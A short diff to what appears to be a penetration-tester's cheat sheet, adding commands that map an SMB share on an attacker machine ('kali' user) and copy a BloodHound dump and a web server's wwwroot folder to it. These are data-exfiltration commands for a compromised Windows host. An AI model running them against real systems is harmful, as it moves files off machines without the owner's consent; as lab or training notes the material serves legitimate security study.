@@ -32,7 +32,16 @@
    ```
     net use z: \\192.168.45.243\SHARE /user:kali kali
     Copy-Item -Path 20240728062407_BloodHound.zip -Destination z:\BloodHound.zip
+    
+    [folder]
+    Copy-Item -Path c:\inetpub\wwwroot -Destination z:\files -Recurse
+
+    [if cmd only --> zip file first then] 
+    xcopy C:\inetpub.zip Z:\
+
     ```
+
+
 
 - Macro example: 
     ``` 
